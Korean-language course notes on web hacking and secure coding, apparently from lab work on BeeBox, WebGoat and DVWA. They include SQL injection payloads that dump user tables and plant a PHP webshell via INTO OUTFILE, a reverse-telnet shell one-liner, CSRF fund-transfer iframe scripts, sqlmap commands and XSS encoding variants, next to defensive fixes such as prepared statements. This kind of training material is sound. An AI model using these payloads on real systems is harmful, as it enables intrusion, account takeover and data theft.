==========================================================================




==========================================================================




==========================================================================




==========================================================================

[ SQL Injection in BeeBox ]

SELECT * FROM movies WHERE title LIKE '%
----------------------------------------------
	1. mysql 데이터베이스의 테이블들 확인
	a%' AND 1=2 UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables #    


	2. movies의 컬럼명 확인
	a%' AND 1=2 UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns
	WHERE table_name = 'movies' #


	3. movies 테이블의 모든 데이터 확인
	a%' AND 1=2 UNION SELECT * 	FROM movies #


	4. users 테이블의 7개 데이터 확인
	a%' and 1=2 union select id,login,password,email,secret,activation_code,activated from users #
-----------------------------------------------
%'


	# SQL Injection으로 파일 업로드하기 (악성코드 실행)
a' union select "<?php","system","($_GET","['cmd'","]",")","?>" into outfile '/var/www/bWAPP/images/test.php' # 

	# BeeBox에서 sql 항목에 삽입 후 bWAPP/images/test.php?cmd=ls 로 공격한다














==========================================================================

[ 책 추천 ]

	# 웹해킹 & 보안 완벽 가이드
		# Server side
		# 1116쪽
		# burp suite를 만든 저자	



	# 브라우저 해킹 & 보안
		# Client side
		# beEF를 만든 저자
		# javascript에 대해 좀 알고 있어야 한다

	


	# 알기 쉬운 정보보호개론
		# 암호에 대해서 알기 쉽게 정리해놨다

	

	# 웹보안 담당자를 위한 취약점 진단 스타트 가이드
		# 2017년 3월 2일 출간한다





					



[ Reverse Telnet ] 

	# Bee-box : OS Command Injection에서 nc를 사용해 Reverse Telnet을 실행해본다
		# 침투자 PC : nc -l -p 555 , nc -l -p 666 을 켜놓고 대기한다
			# nslookup ...; sleep 1000 | telnet 192.168.181.131 555 | /bin/bash | telnet 192.168.181.131 666 
			# 인터넷 창에 입력할 때는 위와 같이 sleep 명령어로 shell이 죽지 않게 만든다


	# Raw Shell : 침투로 인해 획득한 간이쉘
		# 명령어쉘이 네트워크 소켓에 바인딩된 것 
		# stdin, stdout, stderr 등을 처리하지 않는다

		# python -c "import pty; pty.spawn('/bin/bash')" 로 의사터미널을 생성할 수 있다
	








[ PHP ]

	# @eval 명령어 : 문자열을 명령어로 바로 실행시킨다
		ex) <?php @eval ("echo " . $_REQUEST["message"] . ";");?>







[ Server Side Includes, SSI ]

	# CGI ==> Server Side Script 로 추세가 바뀌었다

	# 자주 사용하는 모듈들을 따로 만들어 모든 html 파일에 끼우면 편리하기 때문에 SSI가 탄생했다

	# HTML 페이지에 소스를 수정하지 않고 공통 모듈을 끼우는 방법
	# HTML 주석과 비슷한 형태, 브라우저가 SSI 지시어를 지원하지 않으면 주석으로 처리
	ex)
			<!--#element attribute=value -->

		# 시간포맷을 설정하는 방법
			<!--#config timefmt="%y-%b-%d %a %l:%M:%S" --> 
			<!--#echo var="DATA_LOCAL" -->
		
		# HTML 문서의 크기를 출력
			<!--#config sizefmt="bytes" -->
			<!--#fsize file="index.shtml" -->

		# 문서의 최종 수정일자 출력
			<!--#config timefmt="%y-%b-%d %a %l:%M:%S" --> 
			<!--#flastmod file="index.shtml" -->

		# UNIX 쉘 명령어를 실행하고 결과를 출력
			<!--#exec cmd="ls" -->

		# 일반적인 CGI 프로그램을 실행
			<!--#exec cgi="mycgi.cgi" -->









==========================================================================

[ 널포인터 역참조 ]


# 다음 소스코드에서 Null Pointer 역참조는 어떤 경우에 발생할까요?
/* Tomcat 4.1.2 BUG */
public static int cardinality (Object obj, final Collection col) 
{
    int count = 0;

    if (col == null) 
	{
        return count;
    }
    Iterator it = col.iterator();      

    while (it.hasNext()) 
	{
        Object elt = it.next();
		// obj == null이고 elt != null인 경우 널포인트역참조가 발생한다 
        if ((null == obj && null == elt) || obj.equals(elt))  
		{
            count++;
        }
    }
    return count;
} 


	# java에서 | 와 ||의 차이점 (&, &&)
		a | b   : a가 참이면 b는 참이든 거짓이든 계산은 하지만 참이된다
		a || b  : a가 참이면 b는 자동으로 skip된다 (빠른연산자)

		a & b
		a && b  : a가 거짓이면 b는 자동으로 skip된다 (빠른연산자)








[ 멀티 스레드 동기화 문제 ]

	# C:\SecureCoding\workspace\openeg\WebContent\WEB-INF\board\list.jsp
	jsp에서	<%! ... %>
			<%  ... %>
			<%/* ... */%> 의 의미가 전부 다르다


	C:\SecureCoding\workspace\.metadata\.plugins\org.eclipse.wst.server.core\tmp0\work\Catalina\localhost\openeg\org\apache\jsp\WEB_002dINF\board\list_jsp.java


	여기 파일에 list.jsp 안에 있던 내용들이 .java 파일 형식으로 저장되는 듯 하다
	<%! %> 이 부분은 클래스의 멤버변수로 들어가 있고
	<%  %> 이 부분은 멤버함수의 지역변수로 들어가 있다
	<%/* */%> 는 주석과 비슷한듯









[ 캡슐화 위배 ]

/// 캡슐화 위배되는 코드
class Sample2
{
	private String[] dataArray  = "";

	/// setter
	public void setData(String[] d)
	{
		this.dataArray= d;
	}

	/// getter
	public String[] getData()
	{
		return this.dataArray;
	}
}

	# getter로 배열의 주소를 반환하므로 주소값을 외부에서 변경할 수 있다
	# private member가 배열인 경우 주소가 아닌 값이 리턴되도록 한다




/// 캡슐화 수정 코드
class SampleSafe
{
	private String[] dataArray  = "";

	/// setter : 배열은 이런식으로 들여온다
	public void setData(String[] d)
	{
		if (d != null)
		{
			dataArray = new String[d.length];
			for (int i = 0; i < d.length; i++) 
			{
				this.dataArray[i] = d[i];
			}
		}
	}

	/// getter : 배열은 이런식으로 넘긴다
	public String[] getData()
	{
		String[] temp = null;
		if (this.dataArray != null)
		{
			temp = new String[this.dataArray.length];
			for (int i = 0; i < this.dataArray.length; i++) 
			{
				temp[i] = this.dataArray[i];
			}
		}
		return temp;
	}
}









==========================================================================

[ CRYPTOGRAPHY ]

	# 일상에서 암호화를 구현할 일은 거의 없다. 연구원들 제외하고는
	
	# 일반적인 해커들은 암호화 자체의 취약점보다는 암호화키를 훔쳐가기 위해 노력한다


	# 대칭키 (비밀키, 유일키) <==> 비대칭키 (공개키 암호화 방식)
		# 공유키 <==> 공개키
		
		# 대칭키 :	키 공유의 문제가 생긴다 (고전적 방법)
					상대방이 나와 똑같은 키가 있어야 복호화를 할 수 있기 때문이다
					우리나라는 128비트를 사용한다
					ex) DES, AES, SEED ...


		# 비대칭키 : 키를 2개를 만든다 (개인키, 공개키)
					 공개키로 키 공유의 문제를 해결했다
					 1976년에 개발되어서 혁명을 일으켰다
					 2048비트 이상을 사용한다


					 소인수분해의 알고리즘이 없다는 점을 이용해 엄청 큰 소수를 공개키로 뿌린다
					 	ex) RSA, Rabin
					 이산대수의 문제해결이 어려움을 이용해 알고리즘을 만든다
						ex) ECC, DSA, ElGamal
					 
 					 기밀성 유지 + 부인 방지를 이용한다
						 # 속도가 대칭키보다 약 1000배가 느리다
						 # 주로 대칭키를 전달하는 용도로 사용한다

 A --> (a 개인키 암호화) --> (b 공개키 암호화) --> (b 개인키 복호화) --> (a 공개키 복호화) --> B

dd





[ 파라미터 조작과 잘못된 접근제어 ]

	




[ WEBGOAT ]

	# 이클립스에서 Ctrl-Shift-R 을 누르면 ViewProfile_i 같은 intructor 파일이 나오는데 이것이 해답파일들이다
		# lessons/intructor 폴더 안에 있다






[ 안전하지 않은 리다이렉트와 포워드 ]

	# sendRedirect() 메소드를 사용한다







[ 잘못된 보안 설정 ]









[ HTTP 응답분할 ]

	# cookie 설정할 때 response.addCookie()
	  또는 setHeader() 함수를 사용할 때 
		...등 많은 곳에서 response에 개행문자를 넣을 가능성이 있다





[ 실습환경 ]
	113.198.210.32:9999/dvwa
		# phpmyadmin에서 admin에 관한 md5 패스워드를 크랙한다

	113.198.210.32:8282 













==========================================================================


[ FILE DOWNLOAD VULNERABLITY ]

		# Webshell 


[ BEE BOX ] 

	# WebGoat과 같으나 WebGoat Java기반이지만 
	BeeBox는 php 기반이고 소스코드가 매우 깔끔하다고 한다








==========================================================================

[ CSRF ]

	# Cross Site Request Forgery : 크로스 사이트 요청 위조
		# 캡챠를 사용해서 방어하기도 한다 
			# 구글의 ReCAPTCHA

		# UUID : 128비트, 32글자 8-4-4-4-12형식의 범용식별자를 사용해 보안코드를 작성한다

			
	# CSRF를 실행하기 위한 자바스크립트 : WebGoat CSRF
		# 순차적으로 2개의 URL을 실행시키기 위한 javascript 

		<script> 
		function loadI2()
			{
				document.getElementById("i2").src = "http://192.168.181.1:8080/WebGoat/attack?Screen=6&menu=900&Num=4&transferFunds=CONFIRM";
			}
			</script>

			<iframe id="i1" src="http://192.168.181.1:8080/WebGoat/attack?Screen=6&menu=900&Num=4&transferFunds=4000" width="200" height="200" onload="setTimeout(loadI2,2000)"></iframe>
			<iframe id="i2" src="" width="200" height="200"></iframe>


	# CSRF 토큰을 취득해서 돈을 송금하는 코드 (조금 더 고급버전)

	<script> 
	function loadI2()
		{
			var i1 = document.getElementById("i1");
			var i1d = i1.contentDocument;
			var token = i1d.getElementsByName("CSRFToken")[0].value;
			alert(token);
			document.getElementById("i2").src = "http://....:8080/WebGoat/attack?Screen=2&menu=900&show=Params&transferFunds=4000&CSRFToken"+token;
		}

		</script>

		<iframe id="i1" src="http://....:8080/WebGoat/attack?Screen=2&menu=900&show=Params&transferFunds=main" width="200" height="200" onload="setTimeout(loadI2,2000)"></iframe>
		<iframe id="i2" src="" width="200" height="200"></iframe>




		# CAPTCHA 를 사용해서 CSRF를 방어하는 방법
			# SecureCoding\downloads\jcaptcha 안에 있는 파일들을 
				이클립스 openeg\Webcontent\WEB-INF\lib\에 넣어준다

			# Google Doc 참고  : https://goo.gl/G8LDN4








==========================================================================

[ XSS ]

	# lucy-xss 를 이클립스에 등록시킬 때는 폴더에 바로 복사하지 말고 
	  이클립스를 킨 다음 openeg\Webcontent\WEB-INF\lib\ 안에 드래그 해야 정상적으로 등록된다고 한다

		# 서버 필터링 구동 과정
			1. web.xml ==> XssFilter를 등록한다
			2. 서버가 돌아가면서 web.xml 안에 XssFilter에 맞는 조건이 나오면
			3. XSSFilter.java가 실행되서
			4. XSSRequestWrapper.java가 다시 실행되고 안에 있는 구문들이 자동으로 필터링된다



	# WebGoat 
		# Stored XSS 연습문제

		# /WebGoat/src/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java
			# stage 1 수정하기



		# /WebGoat/WebContent/lessons/CrossSiteScripting/ViewProfile.jsp
			# stage 3 수정하기







[ ECLIPSE ] 

	# 중괄호가 if{
		    	  ...
	     		 }
				이런식으로 되어있으면 
	Preference ==> Java ==> Code Style ==> Formatter ==> Brace에서 바꿔주면 된다











==========================================================================

[ XPath ]

	# XPath를 활용해 http://www.w3schools.com/xml/simple.xml 구문을 쿼리해보는 코드를 작성한다




[ COOKIE & SESSION ]

	# 주소창에 javascript:document.write(document.cookie)
				또는 javascript:alert(document.cookie)
	
		javascript:document.cookie="JSEESIONID=..." 로 수정한다



[ HASH ] 

	# 단방향성을 가지는 암호화 알고리즘이다
		# 복호화가 불가능하다

	# 흔히 물감섞기와 비교된다. 조금의 물감양만 달라도 색깔이 다르게 나타난다

	# salt
		# 서버에서 사용자 패스워드 + a 를 추가해서 보안을 추가해주는 방법이다
		# 소금치는것과 비슷해서 솔트가 됨
	



[ PASSWORD CRAKING ] 

	

[ XSS ]

	# Reflective XSS

	# Stored XSS

	# DOM XSS


	# 스크립트 실행 가능 영역들
		<script>스크립트영역</script>
		<img src="" onerror="스크립트 실행 가능 영역">
		<iframe src="">
		<table background="">
		
		css ==> expression()
				url() 
		... 엄청나게 많다

	# <script> 코드를 막기 어려운 이유 
		# <script> 기호를 변형할 수 있는 경우의 수 : 1,677,721,600,000,000개
	  ex) '<' 변형
			%3c
			&#60 (10진수)
			&#060 
			&#0060 
			&#00060 
			&#000060 
			&#0000060 
			&#x3c (16진수)
			&#x03c
			&#x003c
			&#x0003c
			&#x00003c
			&#x000003c
			&lt
			...





==========================================================================


[ SECURE CODING ]

	# WebGoat Injection Flaw/Stage2 문제
		# Eclipse에서 /WebGoat/src/org/owasp/webgoat/lessons/SQLInjection/Login.java


	....
	public boolean login(WebSession s, String userId, String password)
	{
		boolean authenticated = false;
		
		try
		{
			/// webgoat 수정 코드  
			String query = "SELECT * FROM employee WHERE userid = ? and password = ?";

			try
			{
				/// webgoat 수정 코드 2
				java.sql.PreparedStatement answer_statement = WebSession.getConnection(s)
						.prepareStatement(query, ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);
				
				/// 형식을 입력해준다
				answer_statement.setInt(1, Integer.parseInt(userId));
				answer_statement.setString(1, userId);
				
				/// 쿼리문을 실행한다
				ResultSet answer_results = answer_statement.executeQuery();
	...


	# sql injection LAB #3
		# /WebGoat/src/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java

	...
	public Employee getEmployeeProfile(WebSession s, String userId, String subjectUserId) throws UnauthorizedException
	{
		Employee profile = null;

		// Query the database for the profile data of the given employee
		try
		{
			/// userId는 현재 로그인한 사용자의 값이 저장되므로 수정할 수 없다
			/// 우리는 subjectUserId 값을 조절해야 한다
			String query = "SELECT employee.* "
					+ "FROM employee,ownership WHERE employee.userid = ownership.employee_id and "
					+ "ownership.employer_id =? and ownership.employee_id = ?";
			
			try
			{
				/// 코드 수정
				java.sql.PreparedStatement answer_statement = WebSession.getConnection(s)
						.prepareStatement(query, ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);
				
				answer_statement.setInt(1, Integer.parseInt(userId));
				answer_statement.setInt(2, Integer.parseInt(subjectUserId));
				ResultSet answer_results = answer_statement.executeQuery();




[ SOCAR의 홈페이지의 문제점 ]

	# 데이터 레이어에서의 접근 통제가 안되고 있다


[ 개발 보안 경진대회 도전해보라고 한다 ]

	# 장관상 굳







==========================================================================


[ PANGOLIN ]





[ ACUNETIX ]

	# 취약점 분석툴 sql 인젝션




[ SQLMAP ]

	버전 정보 가져오기
	# sqlmap -u http:192.168.181.132/view.php?id=3 -b    


	현재 사용중인 데이터베이스 목록을 출력한다
	# sqlmap -u http:192.168.181.132/view.php?id=3 -dbs --current-db


	sample 데이터베이스의 테이블과 컬럼을 가져온다
	# sqlmap -u http:192.168.181.132/view.php?id=3 -D sample --tables --columns




[ ECLIPSE ]

	# Ctrl + Shift + R : 리소스 열기




[ SECURE CODING ]

# openeg 홈페이지에서 ID : a'  , PASS : a' 입력하면 에러가 출력된다

	# eclipse ==> openeg/src/kr/co/openeg/lab/login/dao/login.xml 을 수정한다

		<select id="loginCheck2" parameterClass="LoginModel"
				resultClass="LoginModel">
				select
				idx,
				userId,
				userPw,
				userName,
				joinDate
				from board_member

				# 이 부분이 #으로 안되어있어서 보안에 약하다
				where userId = '$userId$' and userPw = '$userPw$'   
				where userId = #userId# and userPw = #userPw#   
			</select>
		</sqlMap>


	# openeg/src/kr/co/openeg/lab/test/controller/TestController.java
	# openeg/src/kr/co/openeg/lab/test/controller/TestUtil.java

		public String readDB(String id, String passwd) {
			StringBuffer result = new StringBuffer();
			Connection con = null;
			java.sql.PreparedStatement st = null;
			ResultSet rs = null;
			try {
				con = EConnection.getConnection(this);
				st = con.createStatement();

				# 이 부분이 취약하다고 한다
				rs = st.executeQuery("select * from board_member where userid='" + id + "' and userpw='" + passwd + "'");
				if (rs.next()) {
					result.append("ID: " + rs.getString(2));
					result.append("    PASSWORD: " + rs.getString(3));
				}


		# 수정 코드
			java.sql.PreparedSatetment st = null;
		  	st = con.prepareStatement("select * from board_member where userid=? and userpw=?");
			st.setString(1, id);
			st.setString(2, passwd);
			rs = st.executeQuery();


	# PreparedStatement가 지원되지 않을 때는
		# public static String SQLFilter(String inputString) 함수를 추가한다
			{
			Pattern pattern = Pattern.compile("['\\-#()@;=*/+]");
			inputString = pattern.matcher(inputString).replaceAll("");
			return inputString;
			}



==========================================================================

[ Regex ]

	# www.regexpal.com
	# www.regexper.com : 정규식을 도식화해주는 사이트

		# 010-1234-5678 (전화번호)에 대한 정규표현식

		[0-9][0-9][0-9]-[0-9][0-9][0-9][0-9]-[0-9][0-9][0-9][0-9]
		
		\d\d\d-\d\d\d\d-\d\d\d\d\d
		
		\d{3}-\d{4}-\d{4}
		
		(\d{3,4}-?){3}
		
		01[016789]-\d{3,4}-\d{4}


# yes24에 자동차해킹 서적이 나왔다고 하시넹

[ Linux ]

	# ln -sf /usr/share/zoneinfo/Asia/Seoul /etc/localtime
	리눅스 시간 바꾸기




==========================================================================

[ PAROS ]




[ WEBGOAT ]

	# paros로 보면 http://192.168.181.1:8080/WebGoat/ 에 들어갈 때 
		# Response에 401 Unauthorized가 뜬다(로그인창)
		# webgoat:webgoat으로 로그인하면 Request에 Authorization Basic ... 항목을 보낸다
			# Authorization Basic 코드가 Base64로 인코딩되어 있어서 쉽게 해독할 수 있다
		

[ HTML 구조 ]

	# 요청 <==> 응답 구조
	# Stateless 형식이라고 한다

	# 쿠키 & 세션
		# 쿠키 : 보안 별로
		# 세션 : 서버에서 생성해서 관리한다 (보안이 좋다)


	# url Encoding
		# 검색창에서 %20, %43 같이 제어문자를 서버로 전송할 때 사용한다












==========================================================================
	root@kail:~# ip a 명령어

[ APACHE2 ] 

	# vim /etc/apache2/mods-available/dir.conf 파일에 디폴트 경로가 적혀있다
	
	# Directory Listing은 반드시 꺼줘야 한다. 보안에 취약하다


[ DNS Spoofing ]

	# ettercap을 사용한다



[ SECURE CODING GUIDE ]


[ HTTP 응답 분할 공격 벡터 ]

	# HTTP는 Header와 본문을 CRLF로 구분하는데 공격명령에서 강제로 CRLF를 넣어주면 
	서버가 알아서 명령을 Header와 본문으로 구분한다





==========================================================================
[ SQL INJECTION ]

	openeg ==> xp에서 접속한다

		id: admin'#'
		pass: bbb'# 

	# mysql에선 이를 주석처리한다


[ CSRF ]
	# Cross Script Request Forgery
		# 서버에서 사용자의 요청이 들어왔을 때 검증을 하지 않았을 경우 공격이 통한다



	? CRUD란?   정보의 주기? 정보공학에 나오는 용어라고 한다.


[ Open Redirect ]

	# 보통 우리가 아는 Phising 공격으로 불린다




==========================================================================









